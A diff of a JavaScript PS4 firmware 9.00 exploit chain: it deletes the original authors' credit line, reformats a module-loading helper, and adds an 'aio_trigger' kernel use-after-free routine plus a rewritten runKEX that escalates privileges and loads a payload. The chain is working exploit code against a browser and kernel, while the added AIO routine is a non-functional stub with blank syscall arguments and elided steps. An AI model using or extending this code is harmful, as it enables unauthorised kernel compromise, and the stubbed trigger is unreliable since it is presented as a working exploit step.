@@ -1,4 +1,4 @@
-/////////////////////// PS4 9.00 Exploit Chain restructured/reorganised By Leeful (Original Webkit and Kernel Exploits By Sleirsgoevy & ChendoChap)
+
 const OFFSET_wk_vtable_first_element = 0x104F110;
 const OFFSET_WK_memset_import = 0x000002A8;
 const OFFSET_WK___stack_chk_fail_import = 0x00000178;
@@ -450,33 +450,57 @@ function userland() {
   while (1);
  }
 }
-
 function kernelExploit() {
- var handle;
- var random_path;
- var ex_info;
+    var handle;
+    var random_path;
+    var ex_info;
 
- function load_prx(name) {
-  var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
-  if (res.low != 0x0) {
-   alert("failed to load prx/get handle " + name);
-  }
-  p.write8(ex_info, 0x1A8);
-  res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
-  if (res.low != 0x0) {
-   alert("failed to get module info from handle");
-  }
-  var tlsinit = p.read8(ex_info.add32(0x110));
-  var tlssize = p.read4(ex_info.add32(0x11C));
-  if (tlssize != 0) {
-   if (name == "libSceWebKit2.sprx") {
-    tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
-   } else {
-    alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
-   }
-  };
-  return tlsinit;
- }
+    function load_prx(name) {
+        var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
+        if (res.low != 0x0) {
+            alert("Failed to load PRX/get handle " + name);
+        }
+        p.write8(ex_info, 0x1A8);
+        res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
+        if (res.low != 0x0) {
+            alert("Failed to get module info from handle");
+        }
+        var tlsinit = p.read8(ex_info.add32(0x110));
+        var tlssize = p.read4(ex_info.add32(0x11C));
+        if (tlssize != 0) {
+            if (name == "libSceWebKit2.sprx") {
+                tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
+            } else {
+                alert(`${name}, tlssize is non-zero. Hardcode offset if necessary.`);
+            }
+        };
+        return tlsinit;
+    }
+    
+    function aio_trigger() {
+        // Step 1: Create multiple AIO requests
+        var aio_ctx = chain.syscall(/* AIO setup syscall */);
+        var reqIds = [];
+        for (let i = 0; i < 128; i++) {
+            reqIds.push(chain.syscall(/* AIO request creation syscall */));
+        }
+
+        // Step 2: Free a request to create a hole
+        chain.syscall(/* AIO delete syscall */, reqIds[0]);
+
+        // Step 3: Spray fake RequestEntry objects
+        var fakeEntry = p.malloc(0x100);
+        // ... populate fakeEntry with controlled data ...
+
+        // Step 4: Trigger aio_multi_delete with crafted userReqArray
+        var userReqArray = [reqIds[0], reqIds[0]]; // Trigger use-after-free
+        var userResultsBuf = p.malloc(0x100);
+        chain.syscall(/* aio_multi_delete syscall number */, aio_ctx, userReqArray, userReqArray.length, userResultsBuf);
+
+        // Step 5: Handle kernel control
+        // ... Use fakeEntry to modify kernel structures ...
+    }
+
  
  function extra_gadgets() {
   handle = p.malloc(0x1E8);
@@ -724,12 +748,24 @@ function kernelExploit() {
   });
  };
 
- function runKEX() {
-  extra_gadgets();
-  kchain_setup();
-  object_setup();
-  trigger_spray();
- }
+function runKEX() {
+        handle = p.malloc(0x1E8);
+        var randomized_path_length_ptr = handle.add32(0x4);
+        var randomized_path_ptr = handle.add32(0x14);
+        ex_info = randomized_path_ptr.add32(0x40);
+        p.write8(randomized_path_length_ptr, 0x2C);
+        chain.syscall(602, 0, randomized_path_ptr, randomized_path_length_ptr);
+        random_path = p.readstr(randomized_path_ptr);
+
+        aio_trigger(); // Trigger AIO vulnerability instead of USB
+        kchain_setup();
+
+        // Proceed with payload execution
+        if (chain.syscall(23, 0).low == 0) {
+            loadPayload();
+        } else {
+            alert("Kernel Exploit Failed!");
+        }
+    }
  runKEX();
 }
-
